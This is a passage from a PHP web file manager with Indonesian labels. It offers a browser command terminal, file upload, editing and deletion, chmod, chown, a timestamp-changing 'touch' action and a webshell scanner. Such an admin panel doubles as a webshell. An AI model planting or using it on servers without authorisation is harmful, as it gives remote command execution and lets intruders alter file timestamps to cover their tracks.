      <a href="#" onclick="quick('uptime');return false;">uptime</a>
      <a href="#" onclick="quick('ps aux --sort=-%mem | head');return false;">top mem</a>
      <a href="#" onclick="quick('ls -la');return false;">ls -la</a>
      <a href="#" onclick="quick('systemctl list-units --type=service --state=running');return false;">services</a>
      <a href="#" onclick="quick('ip a');return false;">ip a</a>
      <a href="#" onclick="quick('whoami');return false;">whoami</a>
    </div>
  </div>

  <?php if (!empty($CONFIG['full_terminal_url'])): ?>
  <div class="panel" style="margin-top:14px;">
    <h2><i class="fa-solid fa-terminal" style="color:var(--green);"></i> Full Terminal <span class="hint">(Ctrl+C · nano · vim · interaktif)</span> <button type="button" class="btn" style="margin-left:auto;" onclick="toggleFullTerm()">Buka / Tutup</button></h2>
    <div id="fullTerm" style="display:<?= !empty($CONFIG['full_terminal_auto_open']) ? 'block' : 'none' ?>;">
      <iframe src="<?= h($CONFIG['full_terminal_url']) ?>" style="width:100%;height:560px;border:none;border-radius:8px;background:#000;"></iframe>
      <p class="hint" style="margin:10px 0 0;">Terminal interaktif penuh — di sini <code>Ctrl+C</code>, <code>nano</code>, <code>vim</code>, <code>top</code>, <code>python</code> jalan normal seperti CMD/SSH. <a href="<?= h($CONFIG['full_terminal_url']) ?>" target="_blank"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka di tab baru</a></p>
    </div>
  </div>
  <?php endif; ?>
</div>

<!-- Chmod modal -->
<div id="chmodModal" class="modal-overlay" style="display:none;" onclick="if(event.target===this)closeChmod()">
  <div class="modal">
    <h3><i class="fa-solid fa-lock" style="color:var(--accent);"></i> Chmod</h3>
    <div class="modal-path" id="chmodPath"></div>
    <table class="chmod-grid">
      <thead><tr><th></th><th>Read</th><th>Write</th><th>Execute</th><th style="width:60px;">Value</th></tr></thead>
      <tbody>
        <tr><td>Owner</td>
          <td><input type="checkbox" id="ur" onchange="chmodCalc()"></td>
          <td><input type="checkbox" id="uw" onchange="chmodCalc()"></td>
          <td><input type="checkbox" id="ux" onchange="chmodCalc()"></td>
          <td class="mono" id="chmodOwnerVal">0</td></tr>
        <tr><td>Group</td>
          <td><input type="checkbox" id="gr" onchange="chmodCalc()"></td>
          <td><input type="checkbox" id="gw" onchange="chmodCalc()"></td>
          <td><input type="checkbox" id="gx" onchange="chmodCalc()"></td>
          <td class="mono" id="chmodGroupVal">0</td></tr>
        <tr><td>Others</td>
          <td><input type="checkbox" id="or" onchange="chmodCalc()"></td>
          <td><input type="checkbox" id="ow" onchange="chmodCalc()"></td>
          <td><input type="checkbox" id="ox" onchange="chmodCalc()"></td>
          <td class="mono" id="chmodOtherVal">0</td></tr>
      </tbody>
    </table>
    <div class="modal-result">Mode: <b id="chmodResult">000</b></div>
    <div class="toolbar" style="margin-top:14px;justify-content:flex-end;">
      <button type="button" onclick="closeChmod()">Batal</button>
      <button type="button" class="primary" onclick="applyChmod()"><i class="fa-solid fa-check"></i> Apply</button>
    </div>
  </div>
</div>

<!-- Drop overlay (drag & drop upload) -->
<div id="dropOverlay" style="display:none;">
  <div class="drop-box">
    <i class="fa-solid fa-cloud-arrow-up"></i>
    <div>Lepaskan file untuk upload ke:<br><span id="dropTarget" class="mono" style="font-size:12px;color:var(--accent);"></span></div>
  </div>
</div>

<!-- Properties modal -->
<div id="propsModal" class="modal-overlay" style="display:none;" onclick="if(event.target===this)closeProps()">
  <div class="modal">
    <h3><i class="fa-solid fa-circle-info" style="color:var(--accent);"></i> Properties</h3>
    <table class="props-table">
      <tr><td>Nama</td><td id="pName" class="mono"></td></tr>
      <tr><td>Path</td><td id="pPath" class="mono"></td></tr>
      <tr><td>Tipe</td><td id="pType"></td></tr>
      <tr><td>Ukuran</td><td id="pSize" class="mono"></td></tr>
      <tr><td>Permission</td><td id="pPerms" class="mono"></td></tr>
      <tr><td>Modified</td><td id="pMtime" class="mono"></td></tr>
    </table>
    <div class="toolbar" style="margin-top:14px;justify-content:flex-end;">
      <button type="button" onclick="closeProps()">Tutup</button>
    </div>
  </div>
</div>

<!-- Context menu -->
<div id="ctxMenu" class="ctx-menu" style="display:none;"></div>

<script>
function gotoPath() {
  var p = document.getElementById('pathInput').value.trim();
  if (!p) return;
  navigate(p);
}
function togglePathEdit() {
  var el = document.getElementById('pathEdit');
  var inp = document.getElementById('pathInput');
  if (el.style.display === 'none' || el.style.display === '') {
    el.style.display = 'flex';
    inp.focus();
    inp.select();
  } else {
    el.style.display = 'none';
  }
}
function toggleAll() {
  var all = document.getElementById('chkAll');
  document.querySelectorAll('.chk').forEach(function(c){ c.checked = all.checked; });
  updateCount();
}
function selectAll() {
  var all = document.getElementById('chkAll');
  all.checked = !all.checked;
  toggleAll();
}
function updateCount() {
  var n = document.querySelectorAll('.chk:checked').length;
  document.getElementById('selCount').textContent = n + ' dipilih';
}
document.addEventListener('change', function(e){ if (e.target.classList.contains('chk')) updateCount(); });
function renameItem(path, name) {
  var nn = prompt('Nama baru:', name);
  if (!nn || nn === name) return;
  postAction({ action: 'rename', old: path, new: nn });
}
var chmodTarget = null;
function chmodItem(path, perms) {
  chmodTarget = path;
  // perms = string octal (mis. "755")
  var bits = parseInt(perms, 8) || 0;
  document.getElementById('ur').checked = (bits & 256) !== 0;
  document.getElementById('uw').checked = (bits & 128) !== 0;
  document.getElementById('ux').checked = (bits & 64) !== 0;
  document.getElementById('gr').checked = (bits & 32) !== 0;
  document.getElementById('gw').checked = (bits & 16) !== 0;
  document.getElementById('gx').checked = (bits & 8) !== 0;
  document.getElementById('or').checked = (bits & 4) !== 0;
  document.getElementById('ow').checked = (bits & 2) !== 0;
  document.getElementById('ox').checked = (bits & 1) !== 0;
  document.getElementById('chmodPath').textContent = path;
  chmodCalc();
  document.getElementById('chmodModal').style.display = 'flex';
}
function chmodCalc() {
  var o = (document.getElementById('ur').checked?4:0) + (document.getElementById('uw').checked?2:0) + (document.getElementById('ux').checked?1:0);
  var g = (document.getElementById('gr').checked?4:0) + (document.getElementById('gw').checked?2:0) + (document.getElementById('gx').checked?1:0);
  var x = (document.getElementById('or').checked?4:0) + (document.getElementById('ow').checked?2:0) + (document.getElementById('ox').checked?1:0);
  document.getElementById('chmodOwnerVal').textContent = o;
  document.getElementById('chmodGroupVal').textContent = g;
  document.getElementById('chmodOtherVal').textContent = x;
  document.getElementById('chmodResult').textContent = '' + o + g + x;
}
function closeChmod() {
  document.getElementById('chmodModal').style.display = 'none';
  chmodTarget = null;
}
function applyChmod() {
  if (!chmodTarget) return;
  var mode = document.getElementById('chmodResult').textContent;
  var target = chmodTarget;   // simpan dulu sebelum closeChmod (yang meng-null chmodTarget)
  closeChmod();
  postAction({ action: 'chmod', target: target, mode: mode });
}
function chownItem(path) {
  var o = prompt('Owner baru (contoh: www-data  atau  www-data:www-data):', 'www-data');
  if (!o) return;
  postAction({ action: 'chown', target: path, owner: o });
}
function touchItem(path, mtime) {
  var dt = prompt('Waktu baru (format: YYYY-MM-DD HH:MM:SS):', mtime);
  if (!dt) return;
  postAction({ action: 'touch', target: path, datetime: dt });
}
function quick(cmd) {
  document.getElementById('termCmd').value = cmd;
  document.getElementById('termForm').submit();
}
function toggleFullTerm() {
  var el = document.getElementById('fullTerm');
  if (!el) return;
  el.style.display = el.style.display === 'none' ? 'block' : 'none';
}
function getSelected() {
  var paths = [];
  document.querySelectorAll('.chk:checked').forEach(function(c) { paths.push(c.value); });
  return paths;
}
function bulkDelete() {
  var paths = getSelected();
  if (paths.length === 0) { alert('Pilih item dulu.'); return; }
  if (!confirm('Hapus ' + paths.length + ' item terpilih?\n\n⚠️ Folder beserta SEMUA isinya akan dihapus permanen!')) return;
  postAction({ action: 'delete', targets: paths });
}
function bulkAction(action) {
  var paths = getSelected();
  if (paths.length === 0) { alert('Pilih item dulu.'); return; }
  postAction({ action: action, targets: paths });
}
function bulkZip() {
  var paths = getSelected();
  if (paths.length === 0) { alert('Pilih item dulu.'); return; }
  var name = prompt('Nama file ZIP:', 'backup-' + new Date().toISOString().slice(0,10) + '.zip');
  if (!name) return;
  postAction({ action: 'zip', targets: paths, zipname: name });
}
function doPaste() {
  postAction({ action: 'paste' });
}
function clearClip() {
  postAction({ action: 'clear_clipboard' });
}
function setSearch(mode) {
  document.getElementById('searchAction').value = mode;
}
function bookmarkAdd() {
  postAction({ action: 'bookmark_add' });
}
function unzipItem(path) {
  if (!confirm('Unzip file ini ke folder sekarang?\n\n' + path)) return;
  postAction({ action: 'unzip', target: path });
}
function doSearch(form) {
  if (!form.q.value.trim()) { alert('Masukkan kata kunci.'); return false; }
  return true;
}
var sortState = {};
function sortTable(col, th) {
  var tbody = document.getElementById('fileRows');
  if (!tbody) return;
  var rows = Array.prototype.slice.call(tbody.querySelectorAll('tr'));
  if (rows.length === 0) return;
  var asc = !sortState[col];
  sortState[col] = asc;
  rows.sort(function(a, b) {
    var ca = a.cells[col] ? a.cells[col].textContent.trim() : '';
    var cb = b.cells[col] ? b.cells[col].textContent.trim() : '';
    var na = parseFloat(ca.replace(/[^0-9.]/g, ''));
    var nb = parseFloat(cb.replace(/[^0-9.]/g, ''));
    var va = (ca !== '' && !isNaN(na) && /[0-9]/.test(ca)) ? na : ca.toLowerCase();
    var vb = (cb !== '' && !isNaN(nb) && /[0-9]/.test(cb)) ? nb : cb.toLowerCase();
    if (va < vb) return asc ? -1 : 1;
    if (va > vb) return asc ? 1 : -1;
    return 0;
  });
  rows.forEach(function(r) { tbody.appendChild(r); });
}
function delOne(path, isDir) {
  var msg = isDir
    ? '⚠️ Hapus FOLDER beserta SEMUA isinya?\n\n' + path + '\n\nSemua file & subfolder di dalamnya akan hilang permanen!'
    : 'Hapus file ini permanen?\n\n' + path;
  if (!confirm(msg)) return;
  postAction({ action: 'delete', targets: [path] });
}
<?php if ($editing || $viewing): ?>
// ---- CodeMirror (editor + viewer) ----
(function loadCM() {
  var deps = [
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/dialog/dialog.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/search/searchcursor.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/search/search.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/comment/comment.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/javascript/javascript.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/xml/xml.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/css/css.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/htmlmixed/htmlmixed.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/clike/clike.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/php/php.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/shell/shell.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/python/python.min.js',
    'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/sql/sql.min.js'
  ];
  var i = 0;
  (function next() {
    if (i >= deps.length) { initEditor(); initViewer(); return; }
    var s = document.createElement('script');
    s.src = deps[i++];
    s.onload = next;
    s.onerror = next;
    document.head.appendChild(s);
  })();
})();

var cmEditor = null;
var cmViewer = null;
function cmMode(name) {
  var ext = ((name.split('.').pop()) || '').toLowerCase();
  var map = {
    'php':'application/x-httpd-php','php3':'application/x-httpd-php','php4':'application/x-httpd-php','php5':'application/x-httpd-php','phtml':'application/x-httpd-php',
    'js':'javascript','mjs':'javascript','json':'application/json','jsx':'javascript',
    'html':'htmlmixed','htm':'htmlmixed','xml':'xml','svg':'xml',
    'css':'css','scss':'css','less':'css',
    'py':'python','sh':'shell','bash':'shell','zsh':'shell',
    'sql':'text/x-sql','c':'text/x-csrc','h':'text/x-csrc','cpp':'text/x-c++src','java':'text/x-java','cs':'text/x-csharp',
    'ini':'text/x-ini','conf':'text/x-ini','env':'text/x-ini','yml':'yaml','yaml':'yaml','md':'markdown'
  };
  return map[ext] || 'null';
}
function initEditor() {
  var ta = document.getElementById('editor');
  if (!ta || typeof CodeMirror === 'undefined') return;
  cmEditor = CodeMirror.fromTextArea(ta, {
    lineNumbers: true,
    mode: cmMode('<?= h(basename($editing ? $editing : $viewing)) ?>'),
    theme: 'material-darker',
    lineWrapping: true,
    indentUnit: 4,
    tabSize: 4,
    autoCloseBrackets: true,
    matchBrackets: true,
    styleActiveLine: true,
    extraKeys: { 'Ctrl-Space': 'autocomplete' }
  });
  cmEditor.on('change', updateEditorInfo);
  updateEditorInfo();
}
function initViewer() {
  var ta = document.getElementById('viewer');
  if (!ta || typeof CodeMirror === 'undefined') return;
  cmViewer = CodeMirror.fromTextArea(ta, {
    lineNumbers: true,
    mode: cmMode('<?= h(basename($viewing ? $viewing : $editing)) ?>'),
    theme: 'material-darker',
    lineWrapping: true,
    readOnly: true
  });
}
function updateEditorInfo() {
  if (!cmEditor) return;
  var chars = cmEditor.getDoc().getValue().length;
  var el = document.getElementById('editorInfo');
  if (el) el.textContent = cmEditor.lineCount() + ' baris · ' + chars + ' karakter';
}
function syncEditor() { if (cmEditor) cmEditor.save(); return true; }
// Simpan file via AJAX (tanpa refresh page)
function saveFile(e) {
  e.preventDefault();
  if (cmEditor) cmEditor.save();
  var form = document.getElementById('editForm');
  var fd = new FormData(form);
  fd.append('ajax', '1');
  var btn = form.querySelector('button[type=submit]');
  if (btn) { btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Menyimpan...'; }
  fetch(window.location.href, { method: 'POST', body: fd })
    .then(function(r) { return r.json(); })
    .then(function(res) {
      toast(res.msg, res.ok ? 'success' : 'error');
      if (res.ok) {
        var overlay = document.querySelector('.editor-overlay');
        if (overlay) overlay.style.display = 'none';
        var url = new URL(window.location.href);
        url.searchParams.delete('edit');
        history.replaceState(null, '', url.toString());
      } else if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-floppy-disk"></i> Simpan'; }
    })
    .catch(function() {
      toast('Gagal menyimpan (jaringan).', 'error');
      if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-floppy-disk"></i> Simpan'; }
    });
  return false;
}
function cmFind() { if (cmEditor) cmEditor.execCommand('find'); }
function cmReplace() { if (cmEditor) cmEditor.execCommand('replace'); }
function cmReplaceAll() { if (cmEditor) cmEditor.execCommand('replaceAll'); }
function cmGoLine() { if (cmEditor) cmEditor.execCommand('jumpToLine'); }
function cmWrap() { if (cmEditor) cmEditor.setOption('lineWrapping', !cmEditor.getOption('lineWrapping')); }
<?php endif; ?>

// Toast notification (tanpa refresh)
function toast(msg, type) {
  var el = document.createElement('div');
  el.className = 'toast ' + (type || 'info');
  el.innerHTML = msg;
  document.body.appendChild(el);
  setTimeout(function() { el.classList.add('show'); }, 10);
  setTimeout(function() {
    el.classList.remove('show');
    setTimeout(function() { el.remove(); }, 350);
  }, 2800);
}
// Post aksi via AJAX (semua aksi file) + soft-reload daftar file (tanpa full refresh)
function postAction(params, cb) {
  var fd = new FormData();
  fd.append('csrf', '<?= h(csrf_token()) ?>');
  fd.append('cwd', '<?= h($cwd) ?>');
  for (var k in params) {
    if (!Object.prototype.hasOwnProperty.call(params, k)) continue;
    var v = params[k];
    if (Array.isArray(v)) { for (var i = 0; i < v.length; i++) fd.append(k + '[]', v[i]); }
    else fd.append(k, v);
  }
  fd.append('ajax', '1');
  return fetch(window.location.href, { method: 'POST', body: fd })
    .then(function(r) { return r.json(); })
    .then(function(res) {
      toast(res.msg, res.ok ? 'success' : 'error');
      if (res.ok) softReload();
      if (cb) cb(res);
    })
    .catch(function() { toast('Gagal (jaringan).', 'error'); });
}
// Soft reload: update tabel + grid tanpa full refresh
function softReload() {
  var url = new URL(window.location.href);
  url.searchParams.set('list', '1');  // ringan: skip dashboard/tree (hemat server)
  fetch(url.toString())
    .then(function(r) { return r.text(); })
    .then(function(html) {
      var doc = new DOMParser().parseFromString(html, 'text/html');
      var nt = doc.getElementById('tableView');
      var ng = doc.getElementById('gridView');
      if (nt && document.getElementById('tableView')) document.getElementById('tableView').innerHTML = nt.innerHTML;
      if (ng && document.getElementById('gridView')) document.getElementById('gridView').innerHTML = ng.innerHTML;
      if (typeof updateCount === 'function') updateCount();
    })
    .catch(function() { location.reload(); });
}
// Navigasi folder via AJAX (tanpa full refresh)
function navigate(path) {
  // tutup modal editor/viewer/chmod bila terbuka
  var overlays = document.querySelectorAll('.editor-overlay, .modal-overlay');
  for (var i = 0; i < overlays.length; i++) overlays[i].style.display = 'none';
  history.pushState(null, '', '?p=' + encodeURIComponent(path));
  fetch('?p=' + encodeURIComponent(path) + '&nav=1')
    .then(function(r) { return r.text(); })
    .then(function(html) {
      var doc = new DOMParser().parseFromString(html, 'text/html');
      var np = doc.getElementById('pathbar');
      var ns = doc.getElementById('sidebar');
      var nt = doc.getElementById('tableView');
      var ng = doc.getElementById('gridView');
      if (np && document.getElementById('pathbar')) document.getElementById('pathbar').outerHTML = np.outerHTML;
      if (ns && document.getElementById('sidebar')) document.getElementById('sidebar').innerHTML = ns.innerHTML;
      if (nt && document.getElementById('tableView')) document.getElementById('tableView').innerHTML = nt.innerHTML;
      if (ng && document.getElementById('gridView')) document.getElementById('gridView').innerHTML = ng.innerHTML;
      window.scrollTo(0, 0);
    })
    .catch(function() { location.href = '?p=' + encodeURIComponent(path); });
}
// Intercept klik link navigasi (?p=...) -> AJAX
document.addEventListener('click', function(e) {
  var a = e.target.closest ? e.target.closest('a[href*="?p="]') : null;
  if (!a) return;
  var m = a.getAttribute('href').match(/[?&]p=([^&]*)/);
  if (!m) return;
  e.preventDefault();
  navigate(decodeURIComponent(m[1]));
});
// Tandai file webshell langsung di DOM (tanpa refresh). Match by basename (scan non-rekursif = 1 folder)
function markHits(hits) {
  if (!hits || !hits.length) return 0;
  var names = {};
  for (var i = 0; i < hits.length; i++) {
    var base = String(hits[i]).split('/').pop();
    if (base) names[base] = true;
  }
  var marked = 0;
  function flag(el) {
    el.classList.add('ws-hit');
    var cell = el.querySelector('.name, .grid-name');
    if (cell && !cell.querySelector('.ws-flag')) {
      var sp = document.createElement('span');
      sp.className = 'ws-flag'; sp.title = 'Webshell mencurigakan!';
      sp.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i>';
      cell.appendChild(sp);
    }
    marked++;
  }
  var all = document.querySelectorAll('tr[data-path], .grid-card[data-path]');
  for (var j = 0; j < all.length; j++) {
    var p = all[j].getAttribute('data-path') || '';
    if (names[p] || names[p.split('/').pop()]) flag(all[j]);
  }
  return marked;
}
// Ganti seluruh halaman tanpa full reload (untuk login/logout)
function swapPage(url) {
  fetch(url)
    .then(function(r) { return r.text(); })
    .then(function(html) {
      document.open();
      document.write(html);
      document.close();
    })
    .catch(function() { location.href = url; });
}
// Logout via AJAX (tanpa full reload)
function doLogout() {
  fetch('?logout=1')
    .then(function(r) { return r.text(); })
    .then(function(html) {
      document.open();
      document.write(html);
      document.close();
    })
    .catch(function() { location.href = '?logout=1'; });
}
// Upload file/folder via AJAX (tanpa reload)
function uploadFiles(input) {
  var form = input.closest('form');
  var files = input.files;
  if (!files || !files.length) { alert('Tidak ada file dipilih.'); return; }
  var n = files.length;
  var progress = document.getElementById('uploadProgress');
  var pctEl = document.getElementById('uploadPct');
  var barEl = document.getElementById('uploadBar');
  var cntEl = document.getElementById('uploadCount');
  var label = document.getElementById('uploadLabel');
  var orig = label ? label.innerHTML : '';
  if (label) label.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Mengupload...';
  if (progress) progress.style.display = 'block';
  if (cntEl) cntEl.textContent = n;
  if (pctEl) pctEl.textContent = '0%';
  if (barEl) barEl.style.width = '0%';
  // Bangun FormData manual (eksplisit, hindari quirk serialisasi form)
  var fd = new FormData();
  fd.append('csrf', form.querySelector('[name=csrf]').value);
  fd.append('cwd', form.querySelector('[name=cwd]').value);
  fd.append('action', 'upload');
  for (var i = 0; i < files.length; i++) {
    fd.append('files[]', files[i], files[i].name);
  }
  fd.append('ajax', '1');
  var xhr = new XMLHttpRequest();
  xhr.open('POST', window.location.href);
  xhr.upload.onprogress = function(e) {
    if (e.lengthComputable && barEl) {
      var pct = Math.round((e.loaded / e.total) * 100);
      barEl.style.width = pct + '%';
      if (pctEl) pctEl.textContent = pct + '%';
    }
  };
  xhr.onload = function() {
    try {
      var res = JSON.parse(xhr.responseText);
      toast(res.msg, res.ok ? 'success' : 'error');
      if (res.ok) softReload();
    } catch (err) {
      toast('Gagal upload (respons tidak valid).', 'error');
    }
    input.value = '';
    if (label) label.innerHTML = orig;
    if (progress) setTimeout(function() { progress.style.display = 'none'; }, 1500);
  };
  xhr.onerror = function() {
    toast('Gagal upload (jaringan).', 'error');
    if (label) label.innerHTML = orig;
    if (progress) progress.style.display = 'none';
  };
  xhr.send(fd);
}
// Intercept semua submit form statis (create/upload/search/dll) -> AJAX
document.addEventListener('submit', function(e) {
  var form = e.target;
  if (!form || form.tagName !== 'FORM') return;
  if (form.id === 'termForm' || form.id === 'editForm' || form.id === 'pathEdit') return; // terminal/edit/path tetap biasa
  e.preventDefault();
  var fd = new FormData(form);
  var act = fd.get('action') || '';
  fd.append('ajax', '1');
  fetch(window.location.href, { method: 'POST', body: fd })
    .then(function(r) { return r.json(); })
    .then(function(res) {
      toast(res.msg, res.ok ? 'success' : 'error');
      if (res.ok) {
        if (act === 'search' || act === 'grep') location.reload();
        else if (act === 'scan_webshell') {
          var marked = markHits(res.hits || []); // tandai icon langsung
          if (!marked) softReload();             // fallback bila markHits gagal
        }
        else softReload();
      }
      form.reset();
    })
    .catch(function() { toast('Gagal (jaringan).', 'error'); });
});

// ---- Drag & drop upload ----
(function() {
  var dragCount = 0;
  function showOverlay(show) {
    document.getElementById('dropOverlay').style.display = show ? 'flex' : 'none';
  }
  document.addEventListener('dragenter', function(e) {
    if (e.dataTransfer && e.dataTransfer.types && Array.prototype.indexOf.call(e.dataTransfer.types, 'Files') !== -1) {
      dragCount++; showOverlay(true);
    }
  });
  document.addEventListener('dragover', function(e) { e.preventDefault(); });
  document.addEventListener('dragleave', function(e) {
    dragCount--; if (dragCount <= 0) { dragCount = 0; showOverlay(false); }
  });
  document.addEventListener('drop', function(e) {
    e.preventDefault();
    dragCount = 0; showOverlay(false);
    if (!e.dataTransfer || !e.dataTransfer.files.length) return;
    var input = document.querySelector('input[type=file][name="files[]"]');
    if (!input) return;
    var dt = new DataTransfer();
    for (var i = 0; i < e.dataTransfer.files.length; i++) dt.items.add(e.dataTransfer.files[i]);
    input.files = dt.files;
    uploadFiles(input);  // pakai jalur AJAX + progress bar (bukan native submit)
  });
})();

// ---- Theme toggle (light/dark) ----
(function() {
  var saved = localStorage.getItem('fm_theme');
  if (saved === 'light') document.body.classList.add('light');
})();
function toggleTheme() {
  var light = document.body.classList.toggle('light');
  localStorage.setItem('fm_theme', light ? 'light' : 'dark');
}
// Auto-refresh folder (minim refresh manual)
var autoRefreshTimer = null;
function toggleAutoRefresh() {
  var btn = document.getElementById('autoBtn');
  if (autoRefreshTimer) {
    clearInterval(autoRefreshTimer);
    autoRefreshTimer = null;
    btn.classList.remove('auto-on');
    localStorage.setItem('fm_autorefresh', 'off');
  } else {
    autoRefreshTimer = setInterval(function() {
      if (!document.hidden) location.reload();
    }, 5000);
    btn.classList.add('auto-on');
    localStorage.setItem('fm_autorefresh', 'on');
  }
}
(function() {
  if (localStorage.getItem('fm_autorefresh') === 'on') toggleAutoRefresh();
})();
function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('show');
}
function showView(view) {
  var f = document.getElementById('filesView');
  var t = document.getElementById('terminalView');
  if (view === 'terminal') {
    f.style.display = 'none';
    t.style.display = 'block';
    var tc = document.getElementById('termCmd');
    if (tc) tc.focus();
  } else {
    t.style.display = 'none';
    f.style.display = 'block';
  }
  localStorage.setItem('fm_screen', view);
  window.scrollTo(0, 0);
}
// Pulihkan view terakhir (biar setelah submit perintah, tetap stay di terminal)
(function() {
  if (localStorage.getItem('fm_screen') === 'terminal') showView('terminal');
})();

// ---- Grid view toggle ----
function toggleGrid() {
  var table = document.getElementById('tableView');
  var grid = document.getElementById('gridView');
  var showing = grid.style.display === 'none' || grid.style.display === '';
  grid.style.display = showing ? 'grid' : 'none';
  table.style.display = showing ? 'none' : 'block';
  document.getElementById('gridBtn').innerHTML = showing
    ? '<i class="fa-solid fa-list"></i> List'
    : '<i class="fa-solid fa-grip"></i> Grid';
  localStorage.setItem('fm_view', showing ? 'grid' : 'list');
}
(function() {
  if (localStorage.getItem('fm_view') === 'grid') toggleGrid();
})();

// ---- Properties dialog ----
function showProps(tr) {
  if (!tr) return;
  var d = tr.dataset;
  document.getElementById('pName').textContent = d.name || '';
  document.getElementById('pPath').textContent = d.path || '';
  document.getElementById('pType').textContent = d.isdir === '1' ? 'Folder' : 'File';
  document.getElementById('pSize').textContent = d.isdir === '1' ? '—' : (d.size || '—');
  document.getElementById('pPerms').textContent = d.perms || '';
  document.getElementById('pMtime').textContent = d.mtime || '';
  document.getElementById('propsModal').style.display = 'flex';
}
function closeProps() { document.getElementById('propsModal').style.display = 'none'; }

// ---- Context menu (right-click) ----
var ctxPath = null, ctxIsDir = false, ctxName = '', ctxTr = null;
function showCtxMenu(e) {
  var tr = e.target.closest ? e.target.closest('[data-path]') : null;
  if (!tr) return;
  e.preventDefault();
  ctxPath = tr.dataset.path;
  ctxIsDir = tr.dataset.isdir === '1';
  ctxName = tr.dataset.name || '';
  ctxTr = tr;
  var menu = document.getElementById('ctxMenu');
  var items = '';
  if (ctxIsDir) {
    items += '<a href="?p=' + encodeURIComponent(ctxPath) + '"><i class="fa-solid fa-folder-open"></i> Buka</a>';
  } else {
    items += '<a href="?view=' + encodeURIComponent(ctxPath) + '&p=' + encodeURIComponent('<?= h($cwd) ?>') + '"><i class="fa-solid fa-eye"></i> Lihat</a>';
    items += '<a href="?edit=' + encodeURIComponent(ctxPath) + '&p=' + encodeURIComponent('<?= h($cwd) ?>') + '"><i class="fa-solid fa-pen-to-square"></i> Edit</a>';
    items += '<a href="?download=' + encodeURIComponent(ctxPath) + '"><i class="fa-solid fa-download"></i> Download</a>';
  }
  items += '<div class="ctx-sep"></div>';
  items += '<div class="ctx-item" onclick="ctxCopy()"><i class="fa-solid fa-copy"></i> Copy</div>';
  items += '<div class="ctx-item" onclick="ctxMove()"><i class="fa-solid fa-scissors"></i> Move</div>';
  items += '<div class="ctx-item" onclick="renameItem(\'' + ctxPath.replace(/'/g, "\\'") + '\', \'' + ctxName.replace(/'/g, "\\'") + '\');hideCtx()"><i class="fa-solid fa-i-cursor"></i> Rename</div>';
  items += '<div class="ctx-item" onclick="chmodItem(\'' + ctxPath.replace(/'/g, "\\'") + '\', \'' + (tr.dataset.perms || '755') + '\');hideCtx()"><i class="fa-solid fa-lock"></i> Chmod</div>';
  items += '<div class="ctx-item" onclick="chownItem(\'' + ctxPath.replace(/'/g, "\\'") + '\');hideCtx()"><i class="fa-solid fa-user-gear"></i> Chown</div>';
  items += '<div class="ctx-item" onclick="touchItem(\'' + ctxPath.replace(/'/g, "\\'") + '\', \'' + (tr.dataset.mtime || '') + '\');hideCtx()"><i class="fa-solid fa-clock"></i> Ganti waktu</div>';
  items += '<div class="ctx-item" onclick="ctxProps()"><i class="fa-solid fa-circle-info"></i> Properties</div>';
  items += '<div class="ctx-sep"></div>';
  items += '<div class="ctx-item danger" onclick="delOne(\'' + ctxPath.replace(/'/g, "\\'") + '\', ' + (ctxIsDir ? 'true' : 'false') + ');hideCtx()"><i class="fa-solid fa-trash-can"></i> Delete</div>';
  menu.innerHTML = items;
  menu.style.display = 'block';
  menu.style.left = Math.min(e.clientX, window.innerWidth - 200) + 'px';
  menu.style.top = Math.min(e.clientY, window.innerHeight - 320) + 'px';
}
function ctxSingle(action) {
  hideCtx();
  postAction({ action: action, targets: [ctxPath] });
}
function ctxCopy() { ctxSingle('copy_selected'); }
function ctxMove() { ctxSingle('move_selected'); }
function ctxProps() { if (ctxTr) showProps(ctxTr); hideCtx(); }
function hideCtx() { document.getElementById('ctxMenu').style.display = 'none'; }
document.addEventListener('contextmenu', showCtxMenu);
// Klik kiri pada baris (bukan link/checkbox/tombol aksi) → tampilkan menu
document.addEventListener('click', function(e) {
  if (e.target.closest && (e.target.closest('a') || e.target.closest('input') || e.target.closest('.actions') || e.target.closest('#ctxMenu'))) return;
  var tr = e.target.closest ? e.target.closest('tr[data-path]') : null;
  if (!tr) { hideCtx(); return; }
  showCtxMenu(e);
});
document.addEventListener('click', function(e) {
  if (!e.target.closest || !e.target.closest('#ctxMenu')) hideCtx();
});

// ---- Keyboard shortcuts ----
document.addEventListener('keydown', function(e) {
  var tag = (e.target.tagName || '').toUpperCase();
  if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;
  if (e.key === 'Delete') {
    if (document.querySelectorAll('.chk:checked').length > 0) { e.preventDefault(); bulkDelete(); }
  } else if (e.key === 'F2') {
    var first = document.querySelector('.chk:checked');
    if (first) {
      var tr = first.closest('tr');
      var name = tr ? (tr.dataset.name || '') : '';
      e.preventDefault(); renameItem(first.value, name);
    }
  } else if (e.ctrlKey && (e.key === 'a' || e.key === 'A')) {
    e.preventDefault(); selectAll();
  }
});

